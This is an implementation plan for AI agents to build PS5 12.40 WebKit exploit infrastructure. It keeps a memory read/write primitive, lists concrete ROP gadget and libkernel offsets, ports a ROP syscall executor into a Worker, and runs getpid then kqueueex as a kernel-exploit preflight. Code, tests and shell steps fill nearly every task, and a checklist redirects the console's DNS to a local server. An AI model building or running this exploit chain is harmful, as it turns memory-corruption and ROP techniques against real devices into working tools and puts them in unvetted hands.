# P2JB Generic Syscall Infrastructure Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Importar o executor genérico de syscalls do P2JB para o SlopKit e validar `getpid()` antes de uma única `kqueueex()` no PS5 12.40.

**Architecture:** Preservar o carrier de leitura/escrita obtido pelo `notify.html`, adaptá-lo a uma API BigInt pequena e alimentar uma versão rastreável do executor ROP em Worker da referência. A inicialização é estrita para 12.40 e interrompe antes de qualquer syscall quando uma base, gadget, stack ou slot não for comprovado.

**Tech Stack:** JavaScript clássico compatível com WebKit do PS5, Web Workers, BigInt, `node:test` e `vm` para testes locais.

**Spec:** `docs/superpowers/specs/2026-09-07-p2jb-syscall-infrastructure-design.md`

## Global Constraints

- Referência fixa: `soniciso1/P2JB` commit `9966b9176ce2592e1ea6808c7288b7d78c6713cc`.
- Firmware inicial e único: PS5 12.40; nenhum fallback de offsets.
- Executar `getpid` (`0x14`) antes de uma única `kqueueex` (`0x08D`).
- Argumento de `kqueueex`: `0x800000000000`.
- Não executar batch, spray, burn, corrida do kernel, notification exploit, jailbreak ou payloads.
- Não simular primitivas, syscalls ou resultados no navegador.
- Falhar fechado antes da primeira syscall quando uma pré-condição não for comprovada.
- Manter UI e formatação fora de `p2jb_preflight.js`.
- Testes locais comprovam estrutura e comportamento isolado, não execução no PS5.

---

## File Structure

- Create `p2jb/lk-12.40.js`: perfil congelado de offsets e gadgets 12.40.
- Create `p2jb/slopkit-adapter.js`: API BigInt de memória, alocação e validações.
- Create `p2jb/rop-slave.js`: Worker mínimo estacionado.
- Create `p2jb/rop-worker.js`: cadeia ROP e executor síncrono de uma chamada.
- Create `p2jb/syscall.js`: inicialização e publicação controlada de `window.syscall`.
- Create `p2jb/loader.js`: carregamento sequencial e latch de execução única.
- Modify `p2jb_preflight.js`: `getpid` seguido por exatamente uma `kqueueex`.
- Modify `notify.html`: preservar o carrier, publicar o contexto e carregar os módulos em ordem.
- Create `test/p2jb_firmware.test.js`: testes do perfil.
- Create `test/p2jb_adapter.test.js`: testes da primitiva e seus gates.
- Create `test/p2jb_rop_worker.test.js`: testes do layout da cadeia.
- Create `test/p2jb_syscall.test.js`: testes de inicialização e argumentos.
- Modify `test/p2jb_preflight.test.js`: testes do fluxo de duas chamadas.
- Create `test/p2jb_loader.test.js`: teste de integração do carregador.
- Create `test/helpers/browser-script.js`: executor `vm` compartilhado pelos testes.

### Task 1: Perfil estrito do firmware 12.40

**Files:**
- Create: `p2jb/lk-12.40.js`
- Create: `test/p2jb_firmware.test.js`
- Create: `test/helpers/browser-script.js`

**Interfaces:**
- Consumes: nenhuma.
- Produces: `window.P2JBFirmware1240`, objeto congelado com `firmware`, `lk` e `wkGadgets`; `loadBrowserScript(path, additions)` para testes.

- [ ] **Step 1: Write the failing profile test**

```javascript
// test/helpers/browser-script.js
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

function loadBrowserScript(relativePath, additions = {}) {
    const window = { ...additions };
    const context = vm.createContext({ window, globalThis: window, ...additions });
    const filename = path.join(__dirname, "..", "..", relativePath);
    vm.runInContext(fs.readFileSync(filename, "utf8"), context, { filename });
    return window;
}
module.exports = { loadBrowserScript };

// test/p2jb_firmware.test.js
test("publica somente os offsets comprovados para 12.40", () => {
    const profile = loadBrowserScript("p2jb/lk-12.40.js").P2JBFirmware1240;
    assert.equal(profile.firmware, "12.40");
    assert.deepEqual(profile.lk, {
        syscallWrapper: 0x1AE47n,
        setjmp: 0x1D3D3n,
        longjmp: 0x1D42Cn,
        pthreadCreate: 0x79B0n,
        slotExpect: 0x1981Bn,
        threadList: 0x68218n,
        pthreadNext: 0x38n,
        pthreadStack: 0xA8n,
        pthreadStackSize: 0xB0n,
    });
    assert.equal(profile.wkGadgets.popRsp, 0x1872n);
    assert.equal(profile.wkGadgets.movQwordRdiRax, 0x86197n);
    assert.ok(Object.isFrozen(profile));
});
```

- [ ] **Step 2: Run the test and verify RED**

Run: `node --test test/p2jb_firmware.test.js`

Expected: FAIL because `p2jb/lk-12.40.js` does not exist.

- [ ] **Step 3: Implement the immutable profile**

```javascript
(function (global) {
    "use strict";
    const profile = {
        firmware: "12.40",
        lk: {
            syscallWrapper: 0x1AE47n, setjmp: 0x1D3D3n,
            longjmp: 0x1D42Cn, pthreadCreate: 0x79B0n,
            slotExpect: 0x1981Bn, threadList: 0x68218n,
            pthreadNext: 0x38n, pthreadStack: 0xA8n,
            pthreadStackSize: 0xB0n,
        },
        wkGadgets: {
            ret: 0xC7n, popRdi: 0x5A469n, popRsi: 0x16B03An,
            popRdx: 0x196067n, popRcx: 0x6CFAn, popRax: 0x6ECCn,
            popRsp: 0x1872n, popR8: 0x716Bn, popR9: 0xFFFF6n,
            movQwordRdiRax: 0x86197n,
        },
    };
    Object.freeze(profile.lk);
    Object.freeze(profile.wkGadgets);
    global.P2JBFirmware1240 = Object.freeze(profile);
})(window);
```

- [ ] **Step 4: Run the test and verify GREEN**

Run: `node --test test/p2jb_firmware.test.js`

Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add p2jb/lk-12.40.js test/helpers/browser-script.js test/p2jb_firmware.test.js
git commit -m "add p2jb firmware 12.40 profile"
```

### Task 2: Preservar e adaptar o carrier de memória

**Files:**
- Create: `p2jb/slopkit-adapter.js`
- Create: `test/p2jb_adapter.test.js`
- Modify: `notify.html:225-250, 880-950, 1038-1490, 1630-1680`

**Interfaces:**
- Consumes: `window.SlopKitP2JBContext` com `firmware`, `candidate`, `rwView`, `webkitBase`, `libkernelBase`, `scratchView`, `scratchAddress`, `worker` e `mark`.
- Produces: `window.SlopKitP2JB` com `read8/16/32/64(address)`, `write8/16/32/64(address,value)`, `malloc(size)`, `bases`, `gadgets`, `worker` e `validate()`.

- [ ] **Step 1: Write failing tests for retargeting, endian conversion and restoration**

```javascript
test("lê e escreve qwords little-endian por um carrier preservado", () => {
    const memory = new Uint8Array(0x100);
    const context = fakeCarrierContext(memory, 0x100000000n);
    const api = installAdapter(context, profile1240());
    api.write64(0x100000020n, 0x1122334455667788n);
    assert.equal(api.read64(0x100000020n), 0x1122334455667788n);
    assert.deepEqual([...memory.slice(0x20, 0x28)],
        [0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11]);
});

test("rejeita firmware diferente de 12.40 antes de publicar a API", () => {
    assert.throws(() => installAdapter(
        fakeCarrierContext(new Uint8Array(0x100), 0x100000000n, "12.60"),
        profile1240()), /firmware 12\.40 required/);
});

test("malloc recusa sair da região scratch de 0x20000 bytes", () => {
    const api = installAdapter(fakeCarrierContext(
        new Uint8Array(0x20000), 0x100000000n), profile1240());
    assert.equal(api.malloc(0x100), 0x100001000n);
    assert.throws(() => api.malloc(0x1F100), /scratch exhausted/);
});
```

- [ ] **Step 2: Run adapter tests and verify RED**

Run: `node --test test/p2jb_adapter.test.js`

Expected: FAIL because `SlopKitP2JBAdapter.install` is undefined.

- [ ] **Step 3: Implement the adapter as a pure installer**

Implement `window.SlopKitP2JBAdapter.install(context, profile)` with:

```javascript
function addressNumber(address) {
    const value = BigInt(address);
    if (value < 0x100000000n || value > 0x0000FFFFFFFFFFFFn)
        throw new RangeError("non-canonical user address");
    return Number(value);
}

function read64(address) {
    context.aim(addressNumber(address));
    let value = 0n;
    for (let i = 7; i >= 0; --i)
        value = (value << 8n) | BigInt(context.rwView[i]);
    return value;
}

function write64(address, value) {
    context.aim(addressNumber(address));
    let remaining = BigInt.asUintN(64, BigInt(value));
    for (let i = 0; i < 8; ++i) {
        context.rwView[i] = Number(remaining & 0xFFn);
        remaining >>= 8n;
    }
}
```

Derive absolute gadgets as `BigInt(context.webkitBase) + offset`. Reserve the
first `0x1000` bytes of scratch and align every `malloc` result to 16 bytes.
`validate()` must write a literal sentinel only inside scratch, read it back,
restore the original qword and verify the restoration.

- [ ] **Step 4: Preserve the real carrier and scratch in `notify.html`**

Before building `targetHolder`, allocate:

```javascript
let p2jbCarrier = null;
let p2jbScratchBuffer = null;
let p2jbScratchView = null;
let p2jbScratchAddress = NaN;
```

Create `p2jbScratchBuffer = new ArrayBuffer(0x20000)` and
`p2jbScratchView = new Uint8Array(p2jbScratchBuffer)`. Store the view in the
existing `targetHolder.q4` slot so its cell address can be recovered without
changing the holder shape. Read its typed-array header and backing-store pointer
with the carrier, validate length `0x20000`, then retain the real candidate in
`p2jbCarrier` instead of setting the last reference to `null` on the successful
path.

Publish only after `leakPass`:

```javascript
window.SlopKitP2JBContext = {
    firmware: FW_LABEL,
    candidate: p2jbCarrier,
    rwView,
    webkitBase: BigInt(webkitBase),
    libkernelBase: BigInt(kernelBase),
    scratchView: p2jbScratchView,
    scratchAddress: BigInt(p2jbScratchAddress),
    aim(address) { aimCarrier(p2jbCarrier, address); },
    mark,
};
```

Do not preserve the candidate on any mismatch or retry path.

- [ ] **Step 5: Run adapter and existing tests**

Run: `node --test test/p2jb_adapter.test.js test/log.test.js test/p2jb_preflight.test.js`

Expected: all tests pass.

- [ ] **Step 6: Commit**

```bash
git add notify.html p2jb/slopkit-adapter.js test/p2jb_adapter.test.js
git commit -m "preserve slopkit primitives for p2jb"
```

### Task 3: Worker e construtor de cadeia ROP

**Files:**
- Create: `p2jb/rop-slave.js`
- Create: `p2jb/rop-worker.js`
- Create: `test/p2jb_rop_worker.test.js`

**Interfaces:**
- Consumes: `SlopKitP2JB` e `P2JBFirmware1240`.
- Produces: `window.P2JBRopWorker.create(memory, profile, worker)`; instância com `buildSyscallChain`, `initialize`, `fireSync`, `syscallSync` e `dead`.

- [ ] **Step 1: Write the failing chain-layout test**

```javascript
test("monta syscall de seis argumentos na ordem ABI do PS5", () => {
    const executor = createExecutor(fakeMemory(), profile1240(), fakeWorker());
    const chain = executor.buildSyscallChain(
        0x1n, [1n, 2n, 3n, 4n, 5n, 6n], 0x200000000n);
    assert.deepEqual(chain, [
        g.popRdi, 1n, g.popRsi, 2n, g.popRdx, 3n,
        g.popRcx, 4n, g.popR8, 5n, g.popR9, 6n,
        g.popRax, 1n, lk.syscallWrapper,
        g.popRdi, 0x200000000n, g.movQwordRdiRax,
    ]);
});

test("recusa nova cadeia depois que o executor trava", () => {
    const executor = createExecutor(fakeMemory(), profile1240(), fakeWorker());
    executor.dead = true;
    assert.throws(() => executor.syscallSync(0x14n), /executor is dead/);
});
```

- [ ] **Step 2: Run the tests and verify RED**

Run: `node --test test/p2jb_rop_worker.test.js`

Expected: FAIL because `p2jb/rop-worker.js` does not exist.

- [ ] **Step 3: Port the focused executor from the pinned reference**

Copy and retain provenance for the following behavior from reference
`rop-worker.js`:

- `Chain.raw`, `Chain.pop`, `Chain.call`, `Chain.store`;
- `enumerate`, `findWorkerStack`, `resolveSlot`;
- `wrap`, `fireSync`, `syscallSync`, `init`;
- `DONE_MAGIC = 0x5A17C0DEF00D1234n`;
- `WORKER_STACK_SIZE = 0x80000n`;
- `CALL_RESERVE = 0x10000n`;
- `CHAIN_CAP = 0x380` bytes;
- stable frame check of both slot words for eight consecutive samples;
- dead latch and diagnostic snapshot on timeout.

Remove only batch/spray APIs and the asynchronous syscall path. Replace direct
`window.read64/write64` access with the injected `memory` interface. Preserve
the chain order and longjmp restoration protocol verbatim.

- [ ] **Step 4: Create the minimal slave**

```javascript
"use strict";
self.onmessage = function () {
    self.postMessage(1);
};
```

- [ ] **Step 5: Run focused tests and syntax checks**

Run: `node --test test/p2jb_rop_worker.test.js && node --check p2jb/rop-worker.js && node --check p2jb/rop-slave.js`

Expected: tests pass and both syntax checks exit 0.

- [ ] **Step 6: Compare the port against the pinned reference**

Run:

```bash
git diff --no-index /private/tmp/p2jb-reference/rop-worker.js p2jb/rop-worker.js
```

Expected: differences are limited to the documented SlopKit adapter, focused
API export and removal of batch/spray/async paths. Review every remaining
difference manually before committing.

- [ ] **Step 7: Commit**

```bash
git add p2jb/rop-worker.js p2jb/rop-slave.js test/p2jb_rop_worker.test.js
git commit -m "port focused p2jb rop worker"
```

### Task 4: Inicialização e API global de syscall

**Files:**
- Create: `p2jb/syscall.js`
- Create: `test/p2jb_syscall.test.js`

**Interfaces:**
- Consumes: `SlopKitP2JB.validate()`, `P2JBFirmware1240`, `P2JBRopWorker.create(...)`.
- Produces: `window.P2JBSyscall.initialize()` e, somente após sucesso, `window.syscall(number,...args)`.

- [ ] **Step 1: Write failing initialization tests**

```javascript
test("publica syscall somente depois de validar e inicializar o executor", () => {
    const calls = [];
    const global = makeGlobal({
        validate() { calls.push("validate"); },
        initialize() { calls.push("initialize"); },
    });
    global.P2JBSyscall.initialize();
    assert.deepEqual(calls, ["validate", "initialize"]);
    assert.equal(typeof global.syscall, "function");
});

test("não publica syscall quando o gate de memória falha", () => {
    const global = makeGlobal({ validate() { throw new Error("rw gate"); } });
    assert.throws(() => global.P2JBSyscall.initialize(), /rw gate/);
    assert.equal(global.syscall, undefined);
});
```

- [ ] **Step 2: Run tests and verify RED**

Run: `node --test test/p2jb_syscall.test.js`

Expected: FAIL because `P2JBSyscall` is undefined.

- [ ] **Step 3: Implement strict initialization**

```javascript
function initialize() {
    if (global.SlopKitP2JB.firmware !== "12.40")
        throw new Error("firmware 12.40 required");
    global.SlopKitP2JB.validate();
    const executor = global.P2JBRopWorker.create(
        global.SlopKitP2JB,
        global.P2JBFirmware1240,
        new Worker("p2jb/rop-slave.js")
    );
    executor.initialize();
    global.syscall = function (number, ...args) {
        const values = args.map((value) => BigInt(value));
        return executor.syscallSync(BigInt(number), ...values).retval;
    };
    return executor;
}
```

Log module start, validation success, Worker discovery and initialization.
Catch nothing here: the loader owns reporting and stopping.

- [ ] **Step 4: Run tests and verify GREEN**

Run: `node --test test/p2jb_syscall.test.js`

Expected: all tests pass.

- [ ] **Step 5: Commit**

```bash
git add p2jb/syscall.js test/p2jb_syscall.test.js
git commit -m "publish validated p2jb syscall api"
```

### Task 5: Preflight `getpid` → `kqueueex`

**Files:**
- Modify: `p2jb_preflight.js`
- Modify: `test/p2jb_preflight.test.js`

**Interfaces:**
- Consumes: synchronous `window.syscall(number: bigint, ...args: bigint[]): bigint` and async-compatible `window.log(message)`.
- Produces: `globalThis.p2jbPreflightPromise` resolving to `{ pid, kqueueexReturn, classification }`; performs no later action.

- [ ] **Step 1: Replace the existing tests with the two-call contract**

```javascript
test("valida getpid antes de chamar kqueueex uma vez", async () => {
    const calls = [];
    const result = await execute({
        syscall(number, ...args) {
            calls.push([number, ...args]);
            return number === 0x14n ? 321n : 14n;
        },
    });
    assert.deepEqual(calls, [
        [0x14n],
        [0x8Dn, 0x800000000000n],
    ]);
    assert.deepEqual(result, {
        pid: 321n,
        kqueueexReturn: 14n,
        classification: "EFAULT",
    });
});

test("não chama kqueueex quando getpid não é plausível", async () => {
    const calls = [];
    await execute({ syscall(number) { calls.push(number); return 0n; } });
    assert.deepEqual(calls, [0x14n]);
});
```

- [ ] **Step 2: Run tests and verify RED**

Run: `node --test test/p2jb_preflight.test.js`

Expected: FAIL because the current preflight calls `kqueueex` directly.

- [ ] **Step 3: Implement the sequential preflight**

Use exactly:

```javascript
const pid = BigInt(syscall(0x14n));
if (pid <= 0n || pid > 0x7FFFFFFFn)
    throw new Error("getpid retorno invalido: " + pid);
await log("[p2jb-preflight] getpid=" + pid);

const result = BigInt(syscall(0x8Dn, 0x800000000000n));
const low32 = BigInt.asUintN(32, result);
const classification = low32 === 14n ? "EFAULT"
    : low32 === 12n ? "ENOMEM"
    : low32 === 0n ? "SUCCESS-NOT-LEAK" : "UNEXPECTED";
```

Return the result object from the async IIFE. Keep the `finally` stop log. Do
not add retries or timers.

- [ ] **Step 4: Run tests and verify GREEN**

Run: `node --test test/p2jb_preflight.test.js`

Expected: all preflight cases pass.

- [ ] **Step 5: Commit**

```bash
git add p2jb_preflight.js test/p2jb_preflight.test.js
git commit -m "validate getpid before kqueueex preflight"
```

### Task 6: Carregador sequencial no `notify.html`

**Files:**
- Modify: `notify.html:365-410, 1630-1685`
- Create: `p2jb/loader.js`
- Create: `test/p2jb_loader.test.js`

**Interfaces:**
- Consumes: arquivos produzidos nas Tasks 1–5 e `window.SlopKitP2JBContext` da Task 2.
- Produces: `loadP2jbInfrastructureOnce()`; Promise única que termina em sucesso ou abort seguro.

- [ ] **Step 1: Write a failing loader behavior test**

```javascript
test("carrega infraestrutura na ordem e inicializa antes do preflight", async () => {
    const events = [];
    const loader = createLoader({
        loadScript(src) { events.push(src); return Promise.resolve(); },
        initialize() { events.push("initialize"); },
        preflight: Promise.resolve().then(() => events.push("preflight")),
    });
    await loader.run();
    assert.deepEqual(events, [
        "p2jb/lk-12.40.js",
        "p2jb/rop-worker.js",
        "p2jb/slopkit-adapter.js",
        "p2jb/syscall.js",
        "initialize",
        "p2jb_preflight.js",
        "preflight",
    ]);
});

test("uma falha interrompe a sequência sem retry", async () => {
    let loads = 0;
    const loader = createLoader({
        loadScript() { loads++; return Promise.reject(new Error("404")); },
    });
    await assert.rejects(loader.run(), /404/);
    assert.equal(loads, 1);
});
```

- [ ] **Step 2: Run tests and verify RED**

Run: `node --test test/p2jb_loader.test.js`

Expected: FAIL because the sequential loader does not exist.

- [ ] **Step 3: Implement a testable loader helper**

Place the reusable loader in `p2jb/loader.js` so `notify.html` remains focused.
Its public API must be:

```javascript
window.P2JBLoader.create({ loadScript, initialize, mark }).run()
```

`run()` memoizes its Promise, loads each script sequentially, calls
`P2JBSyscall.initialize()`, loads the preflight last and awaits
`p2jbPreflightPromise`. On rejection it emits `P2JB-PREFLIGHT-ABORT` once and
rethrows; it never calls `failed()` or schedules a retry.

- [ ] **Step 4: Replace the current one-file loader in `notify.html`**

At `P2JB-ENTRY-PASS`, call only:

```javascript
stopped = true;
loadP2jbInfrastructureOnce().catch(function (error) {
    mark("P2JB-PREFLIGHT-ABORT", String(error).slice(0, 100));
});
return;
```

Remove the path to `commitNotificationProof()` from this branch. Keep the old
function inert rather than deleting unrelated reference code.

- [ ] **Step 5: Run loader and full local tests**

Run: `node --test test/*.test.js`

Expected: all tests pass with zero failures.

- [ ] **Step 6: Run syntax and diff checks**

Run:

```bash
for file in p2jb/*.js; do node --check "$file"; done
node --check p2jb_preflight.js
git -c core.whitespace=cr-at-eol diff --check
```

Expected: all commands exit 0.

- [ ] **Step 7: Commit**

```bash
git add notify.html p2jb/loader.js test/p2jb_loader.test.js
git commit -m "load p2jb syscall infrastructure sequentially"
```

### Task 7: Verificação local e roteiro de hardware

**Files:**
- Create: `docs/p2jb-preflight-12.40.md`

**Interfaces:**
- Consumes: infraestrutura completa das Tasks 1–6.
- Produces: evidência local reproduzível e roteiro de execução no PS5.

- [ ] **Step 1: Run the complete automated suite**

Run:

```bash
node --test test/*.test.js
python3 test/test_host_local.py
```

Expected: zero failures.

- [ ] **Step 2: Run all syntax checks**

Run:

```bash
for file in log.js p2jb_preflight.js p2jb/*.js; do node --check "$file"; done
```

Expected: every file exits 0 with no output.

- [ ] **Step 3: Verify local hosting without executing the exploit**

Run `host-local.py` on a high HTTP port with DNS and HTTPS disabled, request
the following paths, then stop the server:

```text
/index.html
/notify.html
/log.js
/p2jb/lk-12.40.js
/p2jb/rop-worker.js
/p2jb/rop-slave.js
/p2jb/slopkit-adapter.js
/p2jb/syscall.js
/p2jb/loader.js
/p2jb_preflight.js
```

Expected: every request returns HTTP 200 from `base`.

- [ ] **Step 4: Write the hardware checklist**

Document in `docs/p2jb-preflight-12.40.md`:

```markdown
# P2JB preflight — PS5 12.40

1. Confirm the Mac LAN IP; for this session it is `192.168.15.152`.
2. Start `sudo python3 host-local.py --ip 192.168.15.152 --no-update-check --verbose`.
3. Configure the PS5 primary DNS to `192.168.15.152`.
4. Open the User's Guide and select RUN once.
5. Record the last visible log for: carrier, bases, scratch, worker, stack,
   slot, getpid and kqueueex.
6. Stop after the preflight; do not retry automatically.

Passing evidence requires a plausible real getpid followed by a real raw
kqueueex return. Local tests alone do not validate the kernel path.
```

- [ ] **Step 5: Review the complete diff**

Run: `git diff HEAD~6 --stat && git diff HEAD~6 -- PROJECT_RULES.md notify.html p2jb_preflight.js p2jb test docs/p2jb-preflight-12.40.md`

Expected: no payload, notification invocation, retry loop, burn loop or
unrelated refactor is introduced.

- [ ] **Step 6: Commit documentation**

```bash
git add docs/p2jb-preflight-12.40.md
git commit -m "document ps5 12.40 p2jb preflight"
```
